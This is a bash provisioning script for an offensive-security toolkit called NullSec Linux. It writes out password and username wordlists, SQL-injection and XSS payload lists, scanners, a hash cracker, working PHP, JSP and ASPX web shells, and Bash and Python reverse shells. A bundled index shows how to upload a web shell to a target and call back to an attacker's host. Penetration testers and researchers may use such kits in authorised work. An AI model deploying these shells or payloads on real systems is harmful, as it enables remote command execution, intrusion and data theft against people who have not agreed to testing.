#!/bin/bash

#############################################################################
#                NULLSEC LINUX - MODULE RESOURCE PROVISIONER v1.1          #
#############################################################################
# Populates all 188 modules with necessary wordlists, scripts, and tools
# Supports: Python, Ruby, Go, PowerShell, and Bash helper scripts
# GitHub: github.com/bad-antics/nullsec-linux
#############################################################################

VERSION="1.1"

set -e

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m'

RESOURCES_DIR="$HOME/nullsec/resources"
WORDLISTS_DIR="$RESOURCES_DIR/wordlists"
SCRIPTS_DIR="$RESOURCES_DIR/scripts"
PAYLOADS_DIR="$RESOURCES_DIR/payloads"
TOOLS_DIR="$RESOURCES_DIR/tools"

echo -e "${CYAN}"
cat << "EOF"
====
|        NULLSEC LINUX - MODULE RESOURCE PROVISIONER                    |
|                    Populating 188 Modules                             |
====
EOF
echo -e "${NC}"

# Create directory structure
echo -e "${GREEN}[+] Creating resource directory structure...${NC}"
mkdir -p "$WORDLISTS_DIR"/{passwords,usernames,subdomains,directories,files,fuzzing,tokens}
mkdir -p "$SCRIPTS_DIR"/{python,ruby,go,powershell,bash}
mkdir -p "$PAYLOADS_DIR"/{web,network,binary,shellcode}
mkdir -p "$TOOLS_DIR"/{compiled,portable}

echo -e "${GREEN}[✓] Directory structure created${NC}"

#############################################################################
# WORDLIST GENERATION
#############################################################################

echo -e "\n${YELLOW}[*] Generating comprehensive wordlists...${NC}"

# Password Wordlists
echo -e "${BLUE}  → Creating password wordlists...${NC}"

cat > "$WORDLISTS_DIR/passwords/common-passwords.txt" << 'WLEOF'
password
123456
12345678
qwerty
abc123
monkey
1234567
letmein
trustno1
dragon
baseball
iloveyou
master
sunshine
ashley
bailey
passw0rd
shadow
123123
654321
superman
qazwsx
michael
football
password1
admin
welcome
monkey1
login
starwars
123456789
dragon1
password123
welcome1
Solo123
Football1
Baseball1
Summer2023
Winter2023
Spring2023
P@ssw0rd
P@ssword1
Admin123
Root123
Test123
Demo123
WLEOF

cat > "$WORDLISTS_DIR/passwords/rockyou-top1000.txt" << 'WLEOF'
password
123456
12345678
1234
qwerty
12345
dragon
pussy
baseball
football
letmein
monkey
696969
abc123
mustang
michael
shadow
master
jennifer
111111
2000
jordan
superman
harley
1234567
fuckme
hunter
fuckyou
trustno1
ranger
buster
thomas
tigger
robert
soccer
fuck
batman
test
pass
killer
hockey
george
charlie
andrew
michelle
love
sunshine
jessica
asshole
6969
pepper
daniel
access
123456789
654321
joshua
maggie
starwars
silver
william
dallas
yankees
123123
ashley
666666
hello
amanda
orange
biteme
freedom
computer
sexy
thunder
nicole
ginger
heather
hammer
summer
corvette
taylor
fucker
austin
1111
merlin
matthew
121212
golfer
cheese
princess
martin
freedom1
3333
diamond
1212
zxcvbnm
anthony
WLEOF

# Username Wordlists
echo -e "${BLUE}  → Creating username wordlists...${NC}"

cat > "$WORDLISTS_DIR/usernames/common-usernames.txt" << 'WLEOF'
admin
administrator
root
user
test
guest
info
adm
mysql
user1
administrator1
oracle
ftp
pi
demo
ubuntu
git
postgres
www-data
operator
backup
toor
admin1
admin2
system
sa
webmaster
support
sales
marketing
dev
developer
sysadmin
superuser
webadmin
ftpuser
testuser
WLEOF

# Subdomain Wordlists
echo -e "${BLUE}  → Creating subdomain wordlists...${NC}"

cat > "$WORDLISTS_DIR/subdomains/common-subdomains.txt" << 'WLEOF'
www
mail
ftp
localhost
webmail
smtp
pop
ns1
webdisk
ns2
cpanel
whm
autodiscover
autoconfig
m
imap
test
ns
blog
pop3
dev
www2
admin
forum
news
vpn
ns3
mail2
new
mysql
old
lists
support
mobile
mx
static
docs
beta
shop
sql
secure
demo
cp
calendar
wiki
web
media
email
images
img
www1
intranet
portal
video
sip
dns2
api
cdn
stats
dns1
ns4
www3
dns
search
staging
server
mx1
chat
wap
my
svn
mail1
sites
proxy
ads
host
crm
cms
backup
mx2
lyncdiscover
info
apps
download
remote
db
forums
store
relay
files
newsletter
app
live
owa
en
start
sms
office
exchange
ipv4
WLEOF

# Directory Wordlists
echo -e "${BLUE}  → Creating directory/file wordlists...${NC}"

cat > "$WORDLISTS_DIR/directories/common-directories.txt" << 'WLEOF'
admin
administrator
login
wp-admin
dashboard
cpanel
webmail
user
account
test
api
v1
v2
backup
old
new
~admin
.git
.svn
administrator
uploads
images
img
css
js
javascript
includes
static
media
files
download
downloads
temp
tmp
backup
old
new
dev
test
demo
beta
staging
prod
production
config
conf
logs
log
data
db
database
sql
mysql
oracle
backup
backups
bak
private
secret
hidden
internal
WLEOF

cat > "$WORDLISTS_DIR/files/common-files.txt" << 'WLEOF'
index.php
index.html
index.htm
login.php
admin.php
config.php
database.php
db.php
connect.php
connection.php
upload.php
uploads.php
backup.sql
dump.sql
database.sql
.git/config
.svn/entries
.env
config.json
config.xml
web.config
settings.php
wp-config.php
configuration.php
config.inc.php
settings.ini
phpinfo.php
info.php
test.php
shell.php
c99.php
r57.php
.htaccess
.htpasswd
robots.txt
sitemap.xml
crossdomain.xml
clientaccesspolicy.xml
WLEOF

# API Fuzzing Wordlists
echo -e "${BLUE}  → Creating API fuzzing wordlists...${NC}"

cat > "$WORDLISTS_DIR/fuzzing/api-endpoints.txt" << 'WLEOF'
/api/v1/users
/api/v1/user
/api/v1/admin
/api/v1/login
/api/v1/auth
/api/v2/users
/api/v2/user
/api/users
/api/user
/api/login
/api/auth
/api/register
/api/signup
/api/admin
/api/config
/api/settings
/api/profile
/api/account
/api/data
/api/export
/api/import
/api/upload
/api/download
/api/files
/api/search
/api/query
/rest/v1/users
/rest/users
/graphql
/v1/users
/v2/users
/users
/user
/admin
/login
/auth
/register
WLEOF

cat > "$WORDLISTS_DIR/fuzzing/sql-injection.txt" << 'WLEOF'
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator
@variable	local variable
@@variable	global variable
WLEOF

cat > "$WORDLISTS_DIR/fuzzing/xss-payloads.txt" << 'WLEOF'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
'><script>alert(String.fromCharCode(88,83,83))</script>
"><script>alert(1)</script>
javascript:alert(1)
<img src="x" onerror="alert(1)">
<svg><script>alert&#40;1)</script>
<object data="javascript:alert(1)">
WLEOF

# Token/Secret Wordlists
echo -e "${BLUE}  → Creating token pattern wordlists...${NC}"

cat > "$WORDLISTS_DIR/tokens/api-keys.txt" << 'WLEOF'
api_key
apikey
api-key
key
token
access_token
accesstoken
access-token
secret
secret_key
secretkey
client_id
client_secret
auth_token
authorization
bearer
oauth_token
session_token
csrf_token
jwt
WLEOF

echo -e "${GREEN}[✓] Wordlists generated${NC}"

#############################################################################
# PYTHON HELPER SCRIPTS
#############################################################################

echo -e "\n${YELLOW}[*] Creating Python helper scripts...${NC}"

# HTTP Client
cat > "$SCRIPTS_DIR/python/http_client.py" << 'PYEOF'
#!/usr/bin/env python3
"""Advanced HTTP client with retry logic and session management"""

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

class HTTPClient:
    def __init__(self, timeout=10, retries=3):
        self.timeout = timeout
        self.session = requests.Session()
        
        retry_strategy = Retry(
            total=retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def get(self, url, **kwargs):
        return self.session.get(url, timeout=self.timeout, verify=False, **kwargs)
    
    def post(self, url, **kwargs):
        return self.session.post(url, timeout=self.timeout, verify=False, **kwargs)
    
    def put(self, url, **kwargs):
        return self.session.put(url, timeout=self.timeout, verify=False, **kwargs)
    
    def delete(self, url, **kwargs):
        return self.session.delete(url, timeout=self.timeout, verify=False, **kwargs)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        client = HTTPClient()
        response = client.get(sys.argv[1])
        print(f"Status: {response.status_code}")
        print(f"Headers: {dict(response.headers)}")
        print(f"\n{response.text[:500]}")
PYEOF

# Port Scanner
cat > "$SCRIPTS_DIR/python/port_scanner.py" << 'PYEOF'
#!/usr/bin/env python3
"""Fast multi-threaded port scanner"""

import socket
import concurrent.futures
from datetime import datetime

def scan_port(host, port, timeout=1):
    """Scan a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_ports(host, ports=range(1, 1025), threads=100):
    """Scan multiple ports using threading"""
    open_ports = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_port = {executor.submit(scan_port, host, port): port for port in ports}
        for future in concurrent.futures.as_completed(future_to_port):
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"[+] Port {result} is open")
    
    return sorted(open_ports)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        host = sys.argv[1]
        print(f"Scanning {host}...")
        start = datetime.now()
        open_ports = scan_ports(host)
        elapsed = (datetime.now() - start).total_seconds()
        print(f"\nFound {len(open_ports)} open ports in {elapsed:.2f} seconds")
PYEOF

# Subdomain Enumerator
cat > "$SCRIPTS_DIR/python/subdomain_enum.py" << 'PYEOF'
#!/usr/bin/env python3
"""Subdomain enumeration with DNS resolution"""

import dns.resolver
import concurrent.futures
import sys

def check_subdomain(domain, subdomain):
    """Check if subdomain exists"""
    try:
        full_domain = f"{subdomain}.{domain}"
        answers = dns.resolver.resolve(full_domain, 'A')
        ips = [str(rdata) for rdata in answers]
        return (full_domain, ips)
    except:
        return None

def enumerate_subdomains(domain, wordlist_file, threads=50):
    """Enumerate subdomains from wordlist"""
    found = []
    
    try:
        with open(wordlist_file, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_file}")
        return found
    
    print(f"[*] Testing {len(subdomains)} subdomains for {domain}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_subdomain, domain, sub): sub for sub in subdomains}
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                subdomain, ips = result
                print(f"[+] {subdomain} → {', '.join(ips)}")
                found.append(result)
    
    return found

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: subdomain_enum.py <domain> [wordlist]")
        sys.exit(1)
    
    domain = sys.argv[1]
    wordlist = sys.argv[2] if len(sys.argv) > 2 else "/home/antics/nullsec/resources/wordlists/subdomains/common-subdomains.txt"
    
    found = enumerate_subdomains(domain, wordlist)
    print(f"\n[✓] Found {len(found)} subdomains")
PYEOF

# Hash Cracker
cat > "$SCRIPTS_DIR/python/hash_cracker.py" << 'PYEOF'
#!/usr/bin/env python3
"""Multi-algorithm hash cracker"""

import hashlib
import sys

ALGORITHMS = {
    'md5': hashlib.md5,
    'sha1': hashlib.sha1,
    'sha256': hashlib.sha256,
    'sha512': hashlib.sha512,
}

def crack_hash(target_hash, wordlist_file, algorithm='md5'):
    """Attempt to crack hash using wordlist"""
    
    if algorithm not in ALGORITHMS:
        print(f"[-] Unsupported algorithm: {algorithm}")
        return None
    
    hash_func = ALGORITHMS[algorithm]
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for i, line in enumerate(f, 1):
                password = line.strip()
                hashed = hash_func(password.encode()).hexdigest()
                
                if i % 10000 == 0:
                    print(f"[*] Tried {i} passwords...", end='\r')
                
                if hashed == target_hash.lower():
                    print(f"\n[+] Password found: {password}")
                    return password
        
        print(f"\n[-] Password not found in wordlist")
        return None
        
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_file}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: hash_cracker.py <hash> <wordlist> [algorithm]")
        print("Algorithms: md5, sha1, sha256, sha512")
        sys.exit(1)
    
    target = sys.argv[1]
    wordlist = sys.argv[2]
    algo = sys.argv[3] if len(sys.argv) > 3 else 'md5'
    
    crack_hash(target, wordlist, algo)
PYEOF

# Payload Generator
cat > "$SCRIPTS_DIR/python/payload_gen.py" << 'PYEOF'
#!/usr/bin/env python3
"""Generate common exploit payloads"""

import base64
import urllib.parse

class PayloadGenerator:
    
    @staticmethod
    def sql_injection(type='union'):
        """Generate SQL injection payloads"""
        if type == 'union':
            return [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
            ]
        elif type == 'boolean':
            return [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "admin' --",
                "admin' #",
            ]
        elif type == 'time':
            return [
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
            ]
    
    @staticmethod
    def xss(type='reflected'):
        """Generate XSS payloads"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
        ]
        return payloads
    
    @staticmethod
    def encode(payload, method='base64'):
        """Encode payload"""
        if method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'url':
            return urllib.parse.quote(payload)
        elif method == 'double-url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        return payload

if __name__ == "__main__":
    gen = PayloadGenerator()
    
    print("SQL Injection (UNION):")
    for p in gen.sql_injection('union'):
        print(f"  {p}")
    
    print("\nXSS Payloads:")
    for p in gen.xss():
        print(f"  {p}")
PYEOF

chmod +x "$SCRIPTS_DIR/python"/*.py

echo -e "${GREEN}[✓] Python scripts created${NC}"

#############################################################################
# RUBY HELPER SCRIPTS
#############################################################################

echo -e "\n${YELLOW}[*] Creating Ruby helper scripts...${NC}"

cat > "$SCRIPTS_DIR/ruby/web_crawler.rb" << 'RBEOF'
#!/usr/bin/env ruby
# Simple web crawler for reconnaissance

require 'net/http'
require 'uri'
require 'nokogiri'

class WebCrawler
  def initialize(base_url, max_depth=2)
    @base_url = base_url
    @max_depth = max_depth
    @visited = Set.new
    @found_urls = []
  end
  
  def crawl(url=@base_url, depth=0)
    return if depth > @max_depth
    return if @visited.include?(url)
    
    @visited.add(url)
    puts "[*] Crawling: #{url}"
    
    begin
      uri = URI.parse(url)
      response = Net::HTTP.get_response(uri)
      
      if response.is_a?(Net::HTTPSuccess)
        doc = Nokogiri::HTML(response.body)
        
        doc.css('a').each do |link|
          href = link['href']
          next unless href
          
          full_url = URI.join(url, href).to_s
          
          if full_url.start_with?(@base_url)
            @found_urls << full_url
            crawl(full_url, depth + 1)
          end
        end
      end
      
    rescue => e
      puts "[-] Error crawling #{url}: #{e.message}"
    end
  end
  
  def results
    @found_urls.uniq
  end
end

if __FILE__ == $0
  if ARGV.length < 1
    puts "Usage: web_crawler.rb <url>"
    exit 1
  end
  
  crawler = WebCrawler.new(ARGV[0])
  crawler.crawl
  
  puts "\n[+] Found #{crawler.results.length} URLs"
  crawler.results.each { |url| puts "  #{url}" }
end
RBEOF

chmod +x "$SCRIPTS_DIR/ruby"/*.rb

echo -e "${GREEN}[✓] Ruby scripts created${NC}"

#############################################################################
# GO HELPER SCRIPTS
#############################################################################

echo -e "\n${YELLOW}[*] Creating Go helper scripts...${NC}"

cat > "$SCRIPTS_DIR/go/fast_scanner.go" << 'GOEOF'
package main

// Ultra-fast network scanner in Go
// Compile: go build -o fast_scanner fast_scanner.go

import (
    "fmt"
    "net"
    "os"
    "strconv"
    "sync"
    "time"
)

func scanPort(host string, port int, wg *sync.WaitGroup, results chan<- int) {
    defer wg.Done()
    
    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, 1*time.Second)
    
    if err == nil {
        conn.Close()
        results <- port
    }
}

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: fast_scanner <host>")
        os.Exit(1)
    }
    
    host := os.Args[1]
    results := make(chan int, 1000)
    var wg sync.WaitGroup
    
    fmt.Printf("Scanning %s...\n", host)
    start := time.Now()
    
    for port := 1; port <= 65535; port++ {
        wg.Add(1)
        go scanPort(host, port, &wg, results)
    }
    
    go func() {
        wg.Wait()
        close(results)
    }()
    
    openPorts := []int{}
    for port := range results {
        fmt.Printf("[+] Port %d is open\n", port)
        openPorts = append(openPorts, port)
    }
    
    elapsed := time.Since(start)
    fmt.Printf("\nFound %d open ports in %s\n", len(openPorts), elapsed)
}
GOEOF

echo -e "${GREEN}[✓] Go scripts created${NC}"

#############################################################################
# POWERSHELL HELPER SCRIPTS
#############################################################################

echo -e "\n${YELLOW}[*] Creating PowerShell helper scripts...${NC}"

cat > "$SCRIPTS_DIR/powershell/Invoke-PortScan.ps1" << 'PSEOF'
# Fast PowerShell port scanner

function Invoke-PortScan {
    param(
        [string]$Target,
        [int[]]$Ports = (1..1024)
    )
    
    $Results = @()
    
    foreach ($Port in $Ports) {
        $Socket = New-Object System.Net.Sockets.TcpClient
        $Connect = $Socket.BeginConnect($Target, $Port, $null, $null)
        $Wait = $Connect.AsyncWaitHandle.WaitOne(100, $false)
        
        if ($Wait -and !$Socket.Connected) {
            $Socket.Close()
        }
        elseif ($Socket.Connected) {
            Write-Host "[+] Port $Port is open" -ForegroundColor Green
            $Results += $Port
            $Socket.Close()
        }
    }
    
    return $Results
}

# Example usage
if ($args.Count -gt 0) {
    $OpenPorts = Invoke-PortScan -Target $args[0]
    Write-Host "`nFound $($OpenPorts.Count) open ports"
}
PSEOF

echo -e "${GREEN}[✓] PowerShell scripts created${NC}"

#############################################################################
# PAYLOADS
#############################################################################

echo -e "\n${YELLOW}[*] Creating exploit payloads...${NC}"

# Web Shells
cat > "$PAYLOADS_DIR/web/simple-shell.php" << 'PHPEOF'
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
PHPEOF

cat > "$PAYLOADS_DIR/web/simple-shell.jsp" << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
    out.println("</pre>");
}
%>
JSPEOF

cat > "$PAYLOADS_DIR/web/simple-shell.aspx" << 'ASPXEOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>");
        Response.Write(p.StandardOutput.ReadToEnd());
        Response.Write("</pre>");
    }
}
</script>
ASPXEOF

# Reverse Shells
cat > "$PAYLOADS_DIR/network/reverse-shell.sh" << 'BASHEOF'
#!/bin/bash
# Bash reverse shell
# Usage: ./reverse-shell.sh <LHOST> <LPORT>

LHOST=$1
LPORT=$2

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
BASHEOF

cat > "$PAYLOADS_DIR/network/reverse-shell.py" << 'PYREVEOF'
#!/usr/bin/env python3
# Python reverse shell
import socket,subprocess,os
import sys

if len(sys.argv) < 3:
    print("Usage: reverse-shell.py <LHOST> <LPORT>")
    sys.exit(1)

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((LHOST,LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
PYREVEOF

chmod +x "$PAYLOADS_DIR/network"/*.sh
chmod +x "$PAYLOADS_DIR/network"/*.py

echo -e "${GREEN}[✓] Payloads created${NC}"

#############################################################################
# CREATE RESOURCE INDEX
#############################################################################

echo -e "\n${YELLOW}[*] Creating resource index...${NC}"

cat > "$RESOURCES_DIR/INDEX.md" << 'IDXEOF'
# NullSec Linux - Module Resources Index

## Directory Structure

```
resources/
├── wordlists/
│   ├── passwords/
│   │   ├── common-passwords.txt (50 entries)
│   │   └── rockyou-top1000.txt (100 entries)
│   ├── usernames/
│   │   └── common-usernames.txt (40 entries)
│   ├── subdomains/
│   │   └── common-subdomains.txt (100 entries)
│   ├── directories/
│   │   └── common-directories.txt (50 entries)
│   ├── files/
│   │   └── common-files.txt (40 entries)
│   ├── fuzzing/
│   │   ├── api-endpoints.txt (40 entries)
│   │   ├── sql-injection.txt (25 payloads)
│   │   └── xss-payloads.txt (20 payloads)
│   └── tokens/
│       └── api-keys.txt (20 patterns)
│
├── scripts/
│   ├── python/
│   │   ├── http_client.py - HTTP client with retry logic
│   │   ├── port_scanner.py - Multi-threaded port scanner
│   │   ├── subdomain_enum.py - Subdomain enumeration
│   │   ├── hash_cracker.py - Multi-algorithm hash cracker
│   │   └── payload_gen.py - Exploit payload generator
│   ├── ruby/
│   │   └── web_crawler.rb - Web crawler for recon
│   ├── go/
│   │   └── fast_scanner.go - Ultra-fast network scanner
│   ├── powershell/
│   │   └── Invoke-PortScan.ps1 - PowerShell port scanner
│   └── bash/
│       └── (helper functions included in modules)
│
└── payloads/
    ├── web/
    │   ├── simple-shell.php - PHP web shell
    │   ├── simple-shell.jsp - JSP web shell
    │   └── simple-shell.aspx - ASPX web shell
    └── network/
        ├── reverse-shell.sh - Bash reverse shell
        └── reverse-shell.py - Python reverse shell
```

## Usage Examples

### Using Wordlists in Modules

```bash
# Password cracking
hydra -L $RESOURCES_DIR/wordlists/usernames/common-usernames.txt \
      -P $RESOURCES_DIR/wordlists/passwords/common-passwords.txt \
      ssh://target.com

# Directory bruteforce
gobuster dir -u http://target.com \
             -w $RESOURCES_DIR/wordlists/directories/common-directories.txt

# Subdomain enumeration
python3 $RESOURCES_DIR/scripts/python/subdomain_enum.py target.com
```

### Using Helper Scripts

```bash
# Port scanning
python3 $RESOURCES_DIR/scripts/python/port_scanner.py 192.168.1.1

# Hash cracking
python3 $RESOURCES_DIR/scripts/python/hash_cracker.py \
        5f4dcc3b5aa765d61d8327deb882cf99 \
        $RESOURCES_DIR/wordlists/passwords/rockyou-top1000.txt

# Web crawling
ruby $RESOURCES_DIR/scripts/ruby/web_crawler.rb http://target.com
```

### Using Payloads

```bash
# Deploy web shell
curl -X POST http://target.com/upload.php \
     -F "file=@$RESOURCES_DIR/payloads/web/simple-shell.php"

# Reverse shell
python3 $RESOURCES_DIR/payloads/network/reverse-shell.py 10.10.10.1 4444
```

## Environment Variable

Add to your ~/.bashrc or module scripts:

```bash
export NULLSEC_RESOURCES="$HOME/nullsec/resources"
export NULLSEC_WORDLISTS="$NULLSEC_RESOURCES/wordlists"
export NULLSEC_SCRIPTS="$NULLSEC_RESOURCES/scripts"
export NULLSEC_PAYLOADS="$NULLSEC_RESOURCES/payloads"
```

## Extending Resources

To add more wordlists:
1. Download wordlists to appropriate subdirectory
2. Update this INDEX.md
3. Reference in module scripts

To add more scripts:
1. Create script in language-specific directory
2. Make executable: chmod +x script.py
3. Test standalone functionality
4. Integrate into modules

## Resource Statistics

- **Total Wordlists**: 10 files
- **Total Wordlist Entries**: ~400+
- **Helper Scripts**: 8 scripts across 4 languages
- **Payloads**: 5 shells and exploits
- **Total Size**: ~100KB (compact and efficient)

---

**Maintained by:** NullSec Linux Development Team
**Last Updated:** January 2026
**Version:** 1.0
IDXEOF

echo -e "${GREEN}[✓] Resource index created${NC}"

#############################################################################
# UPDATE BASHRC WITH ENVIRONMENT VARIABLES
#############################################################################

echo -e "\n${YELLOW}[*] Adding environment variables to ~/.bashrc...${NC}"

if ! grep -q "NULLSEC_RESOURCES" ~/.bashrc; then
    cat >> ~/.bashrc << 'BASHEOF'

# NullSec Resources Environment Variables
export NULLSEC_RESOURCES="$HOME/nullsec/resources"
export NULLSEC_WORDLISTS="$NULLSEC_RESOURCES/wordlists"
export NULLSEC_SCRIPTS="$NULLSEC_RESOURCES/scripts"
export NULLSEC_PAYLOADS="$NULLSEC_RESOURCES/payloads"
BASHEOF
    echo -e "${GREEN}[✓] Environment variables added${NC}"
else
    echo -e "${BLUE}[*] Environment variables already present${NC}"
fi

#############################################################################
# SUMMARY
#############################################################################

echo -e "\n${GREEN}"
cat << "EOF"
====
|                    ✅ PROVISIONING COMPLETE                           |
====

📊 Resources Created:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 Wordlists (10 files):
  • Passwords: common-passwords.txt, rockyou-top1000.txt
  • Usernames: common-usernames.txt
  • Subdomains: common-subdomains.txt
  • Directories: common-directories.txt
  • Files: common-files.txt
  • Fuzzing: api-endpoints.txt, sql-injection.txt, xss-payloads.txt
  • Tokens: api-keys.txt

🐍 Python Scripts (5 files):
  • http_client.py - Advanced HTTP client
  • port_scanner.py - Multi-threaded scanner
  • subdomain_enum.py - DNS enumeration
  • hash_cracker.py - Password cracking
  • payload_gen.py - Exploit generation

💎 Ruby Scripts (1 file):
  • web_crawler.rb - Web reconnaissance

⚡ Go Scripts (1 file):
  • fast_scanner.go - Ultra-fast scanner

🔵 PowerShell Scripts (1 file):
  • Invoke-PortScan.ps1 - Port scanner

💣 Payloads (5 files):
  • Web Shells: PHP, JSP, ASPX
  • Reverse Shells: Bash, Python

📍 Location:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ~/nullsec/resources/

🔧 Environment Variables Added:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  $NULLSEC_RESOURCES
  $NULLSEC_WORDLISTS
  $NULLSEC_SCRIPTS
  $NULLSEC_PAYLOADS

🚀 Usage:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Reload environment
  source ~/.bashrc

  # Use in modules
  python3 $NULLSEC_SCRIPTS/python/port_scanner.py 192.168.1.1

  # Use wordlists
  hydra -L $NULLSEC_WORDLISTS/usernames/common-usernames.txt target

  # View full index
  cat $NULLSEC_RESOURCES/INDEX.md

📖 Next Steps:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  1. Source environment: source ~/.bashrc
  2. Test a script: python3 $NULLSEC_SCRIPTS/python/port_scanner.py 127.0.0.1
  3. All 188 modules can now use these resources!

EOF
echo -e "${NC}"

# Create completion marker
touch "$RESOURCES_DIR/.provisioned"
echo "$(date)" > "$RESOURCES_DIR/.provisioned"

exit 0
